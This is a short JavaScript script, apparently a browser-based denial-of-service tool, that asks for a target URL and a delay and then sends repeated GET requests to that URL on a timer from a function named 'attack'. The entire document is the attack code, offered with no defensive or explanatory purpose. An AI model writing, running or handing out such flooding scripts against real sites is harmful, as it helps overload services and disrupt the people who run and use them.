var target_Url = prompt("targeted url");
var speed = prompt("Make request ever [blank] miliseconds");

function attack(){
    var xhr = new XMLHttpRequest();
    xhr.open("GET", "http://"+target_Url, true);
    xhr.send();
    }
    setInterval(attack, speed);  